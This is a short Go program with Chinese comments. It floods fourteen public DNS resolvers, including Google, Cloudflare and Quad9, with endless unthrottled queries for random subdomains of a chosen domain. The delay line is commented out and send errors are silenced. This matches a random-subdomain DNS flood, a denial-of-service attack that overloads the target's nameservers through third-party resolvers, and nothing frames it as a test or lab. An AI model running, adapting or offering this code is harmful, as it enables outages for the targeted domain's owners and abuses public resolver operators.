package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"

	"github.com/miekg/dns"
)

var (
	mainDomain = flag.String("domain", "example.com", "Main domain to query")
	queryType  = flag.String("type", "A", "Type of DNS query (A, MX, NS, etc.)")
)

func main() {
	flag.Parse()

	// DNS服务器的地址数组
	dnsServers := []string{
		"8.8.8.8:53",
		"8.8.4.4:53",
		"1.1.1.1:53",
		"1.0.0.1:53",
		"223.6.6.6:53",
		"223.5.5.5:53",
		"114.114.114.114:53",
		"114.114.115.115:53",
		"9.9.9.9:53",
		"149.112.112.112:53",
		"77.88.8.8:53",
		"101.198.198.198:53",
		"8.26.56.26:53",
		"4.2.2.1:53",
		//更多服务器
	}

	// 将请求类型字符串转换为dns.TypeXXX
	qType, ok := dns.StringToType[*queryType]
	if !ok {
		fmt.Println("Invalid query type. Please use A, MX, NS, etc.")
		return
	}

	// 创建一个等待组，用于等待所有goroutine完成
	var wg sync.WaitGroup

	// 为每个DNS服务器启动一个goroutine
	for _, serverAddr := range dnsServers {
		wg.Add(1)
		go func(addr string) {
			defer wg.Done()
			sendDNSQueries(addr, *mainDomain, qType)
		}(serverAddr)
	}

	// 等待所有goroutine完成
	wg.Wait()
}

func sendDNSQueries(serverAddr string, domain string, qType uint16) {
	// 创建一个UDP连接
	conn, err := net.Dial("udp", serverAddr)
	if err != nil {
		fmt.Printf("Error connecting to DNS server %s: %v\n", serverAddr, err)
		return
	}
	defer conn.Close()

	// 死循环发送查询
	for {
		// 生成随机的子域名
		subdomain := generateRandomSubdomain(domain)

		// 创建一个DNS查询
		msg := new(dns.Msg)
		msg.SetQuestion(dns.Fqdn(subdomain), qType)

		// 打包查询
		data, err := msg.Pack()
		if err != nil {
			fmt.Printf("Error packing DNS message for %s: %v\n", serverAddr, err)
			return
		}

		// 发送查询
		_, err = conn.Write(data)
		if err != nil {
			//fmt.Printf("Error sending DNS query to %s: %v\n", serverAddr, err)

		}

		//fmt.Printf("DNS query sent to %s for %s\n", serverAddr, subdomain)

		// 这里可以添加延迟来控制发送查询的频率
		//time.Sleep(1 * time.Second) // 每秒发送一次查询
	}
}

func generateRandomSubdomain(domain string) string {
	// 生成2-15级长度的子域名
	levels := rand.Intn(14) + 2 // 生成2-15之间的随机数
	subdomain := ""
	for i := 0; i < levels; i++ {
		subdomain += generateRandomString(rand.Intn(10)+1) + "." // 每个级别使用1-10个字符的随机字符串
	}
	return subdomain + domain
}

func generateRandomString(length int) string {
	const charset = "123456789abcdefghijklmnopqrstuvwxyz"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func init() {
	// 初始化随机数生成器
	rand.Seed(time.Now().UnixNano())
}
